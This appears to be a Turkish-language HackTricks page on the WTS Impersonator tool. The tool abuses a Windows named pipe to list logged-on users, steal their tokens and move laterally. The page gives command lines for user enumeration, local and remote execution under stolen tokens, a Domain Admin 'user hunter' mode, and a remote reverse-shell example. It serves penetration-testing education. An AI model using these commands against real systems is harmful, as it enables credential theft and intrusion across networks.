# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** aracı, oturum açmış kullanıcıları gizlice enumerate etmek ve token'larını ele geçirmek için **"\\pipe\LSM_API_service"** RPC Named pipe'ını istismar eder; böylece geleneksel Token Impersonation tekniklerini atlatır. Bu yaklaşım, ağlar içinde sorunsuz lateral movement gerçekleştirilmesini kolaylaştırır. Bu tekniğin arkasındaki yenilik, çalışmasına [GitHub](https://github.com/OmriBaso/WTSImpersonator) üzerinden erişilebilen **Omri Baso**'ya aittir.<sup>[[1]](#references)</sup>

### Temel İşlevsellik

Araç, bir dizi API çağrısı üzerinden çalışır:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Temel Modüller ve Kullanım

- **Kullanıcıları Enumerate Etme**: Araçla, aşağıdaki komutlar kullanılarak yerel ve uzak kullanıcı enumeration işlemleri gerçekleştirilebilir:

- Yerel:
```bash
.\WTSImpersonator.exe -m enum
```
- Bir IP adresi veya hostname belirterek uzak:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Komut Çalıştırma**: `exec` ve `exec-remote` modüllerinin çalışması için **Service** context gerekir. Yerel çalıştırma için yalnızca WTSImpersonator executable dosyası ve bir komut gerekir:

- Yerel komut çalıştırma örneği:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Bir Service context elde etmek için PsExec64.exe kullanılabilir:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Uzak Komut Çalıştırma**: PsExec.exe'ye benzer şekilde uzaktan bir Service oluşturulmasını ve kurulmasını içerir; böylece uygun izinlerle çalıştırma yapılabilir.

- Uzak çalıştırma örneği:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Modülü**: Birden fazla makinedeki belirli kullanıcıları hedef alarak kodu onların kimlik bilgileri altında çalıştırır. Bu, birkaç sistemde local admin haklarına sahip Domain Admins kullanıcılarını hedeflemek için özellikle kullanışlıdır.
- Kullanım örneği:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Referanslar

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
